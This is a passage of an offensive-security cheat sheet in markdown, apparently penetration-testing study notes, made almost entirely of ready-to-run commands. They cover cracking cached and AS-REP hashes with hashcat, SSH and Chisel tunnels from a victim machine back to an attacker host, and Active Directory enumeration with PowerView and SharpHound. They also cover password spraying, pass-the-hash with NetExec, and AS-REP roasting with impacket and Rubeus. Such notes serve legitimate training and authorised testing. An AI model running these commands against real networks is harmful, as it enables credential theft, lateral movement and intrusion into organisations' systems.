hashcat -m2100 '$DCC2$10240#<<USERNAME>>#<<HASH>>' /usr/share/wordlists/rockyou.txt --force --potfile-disable
```
# Pivoting

## SSH local port forwarding

For this to work you need to have `ssh` server running.

```
sudo systemctl start ssh
```

On kali:
```
ssh -L 5000:localhost:8080 <<USERNAME>>@<<VICTIM_IP>>
```

Running this command will make port 8080 on victim machine accessible to my attacking machine on port 5000.

## SSH Remote Port Forwarding

On kali:
```
sudo systemctl start ssh
```

On victim machine:
```
ssh -N -R 9998 <<USERNAME>>@<<KALI_IP>>
```

This command sets up a remote port forwarding tunnel where any connections to port `9998` on the remote server `<<KALI_IP>>` will be forwarded to the SSH client machine

## Chisel

On kali:
```
chisel server -p 8001 --reverse
```

On victim machine:
```
.\chisel.exe client <<KALI_IP>>:8001 R:1080:socks
```

Edit `/etc/proxychains4.conf`:
```
socks 127.0.0.1 1080
```

# Active Directory

## Enumerating AD

### Legacy Tools

```
net user /domain
```

```
net user <<USERNAME>> /domain
```

```
net group /domain
```

```
net group "<<GROUP>>" /domain
```

### PowerView

```powershell
Import-Module .\PowerView.ps1
```

**Information about the domain**
```powershell
Get-NetDomain
```

**List Users**
```powershell
Get-NetUser
```

```
Get-NetUser | select cn
```

**List Groups**
```
Get-NetGroup
```

```
Get-NetGroup "Sales Department" | select member
```

**Enumerate the computer objects**
```
Get-NetComputer
```

**Find possible local administrative access on computers under the current user context**
```
Find-LocalAdminAccess
```

**Find any logged in users**
```
Get-NetSession -ComputerName files04 -Verbose
```
#### Enumerating Domain Shares

```powershell
Find-DomainShare
```

### SharpHound

#### Collecting Data

```powershell
Import-Module .\Sharphound.ps1
```

```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory <<PATH>> -OutputPrefix "prexif"
```

OR

```
SharpHound.exe --CollectionMethods All --ZipFileName output.zip
```

#### Analysing Data

```
sudo neo4j start
```

```
bloodhound
```

## Attacking AD

### Password Attacks

#### Spray-Passwords.ps1

Script automatically identifies domain users and sprays a password against them.

```
powershell -ep bypass
```

```
.\Spray-Passwords.ps1 -Pass <<PASSWORD>> -Admin
```

```
.\Spray-Passwords.ps1 -File <<PASSWORD_FILE>> -Admin
```

#### NetExec

```
nxc smb 172.16.190.82 -u john -p passwords.txt --continue-on-success
```

```
nxc smb 172.16.190.82 -u john -H <<HASH>>
```

```
nxc rdp 172.16.190.82 -u john -p passwords.txt --continue-on-success
```

### AS-REP Roasting

#### impacket-GetNPUsers (Linux)

```
impacket-GetNPUsers -dc-ip <<DC_IP>> -request -outputfile hashes.asreproast <<DOMAIN>>/<<USERNAME>>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
```

#### Rubeus (Windows)

Rubeus will automatically identify vulnerable user accounts.

```powershell
.\Rubeus.exe asreproast /nowrap
```

#### Cracking AS-REP Hash

```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

